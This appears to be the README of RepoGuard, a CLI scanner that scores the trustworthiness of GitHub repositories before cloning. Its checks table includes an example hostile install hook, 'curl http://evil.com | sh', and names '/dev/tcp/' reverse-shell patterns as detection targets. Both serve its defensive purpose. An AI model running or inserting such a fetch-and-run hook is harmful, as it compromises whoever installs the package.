# RepoGuard

Scan GitHub repos for trust scoring **before** you `git clone`.

Every day, malicious actors clone popular repos, inject backdoors into install hooks, typosquat package names, and share them on social media. RepoGuard analyzes a repository through the GitHub API — without cloning — and gives you a **0-100 trust score**.

## Install

```bash
git clone https://github.com/unaltuzun/repoguard.git
cd repoguard
npm install
npm run build
```

## Usage

```bash
# Set token for higher rate limits (recommended)
export GITHUB_TOKEN=ghp_...

# Scan a repo
npx tsx bin/repoguard.ts scan https://github.com/user/repo

# Run specific checks only
npx tsx bin/repoguard.ts scan https://github.com/user/repo --checks metadata,install-hooks

# JSON output for CI/CD pipelines
npx tsx bin/repoguard.ts scan https://github.com/user/repo --json
```

## What It Checks

| Check | What It Scans | Example Red Flag |
|-------|--------------|------------------|
| **Metadata** | Repo age, stars, contributors, commit frequency, owner profile | 3-day-old account, 0 stars, single bulk commit |
| **Identity** | Typosquat detection via Levenshtein distance against 120+ popular repos | `react-hookz` → 92% similar to `facebook/react-hooks` |
| **Code Patterns** | eval(), base64 payloads, obfuscation, reverse shells, cryptominers | `_0x4a3b` variable names, `/dev/tcp/` patterns |
| **Install Hooks** | postinstall scripts, setup.py cmdclass, Makefile, build.rs | `postinstall: curl http://evil.com \| sh` |
| **Dependencies** | Known malicious packages (30+), dependency typosquatting | `crossenv` instead of `cross-env` |

## Scoring

```
90-100  ✅ SAFE     — Looks trustworthy
70-89   ⚠️  CAUTION  — Proceed with care
40-69   🟠 RISKY    — Review before cloning
 0-39   🔴 DANGER   — Do not clone
```

Exit code `2` on DANGER score for CI/CD integration.

## Example Output

```
╔════════════════════════════════════════════════════════════╗
║  RepoGuard Scan Results                                    ║
║  Target: shadyuser/react-hookz                             ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║  TRUST SCORE: 23/100  🔴 DANGER                            ║
║                                                            ║
║  ▸ Metadata        [35/100] Account created 3 days ago     ║
║  ▸ Identity        [15/100] 92% similar to "react-hooks"   ║
║  ▸ Code Patterns   [20/100] 3 base64 payloads found        ║
║  ▸ Install Hooks   [ 0/100] postinstall: curl | sh         ║
║  ▸ Dependencies    [45/100] 2 typosquat dependencies       ║
║                                                            ║
║  FINDINGS:                                                 ║
║  ✘ postinstall script runs: curl http://... | sh           ║
║  ✘ Base64 payload in src/utils.js:42                       ║
║  ! Repo name 92% similar to facebook/react-hooks           ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
```

## Tech Stack

- **Runtime**: Node.js + TypeScript
- **CLI**: Commander
- **GitHub API**: Octokit
- **Terminal UI**: Chalk + Ora

## License

MIT
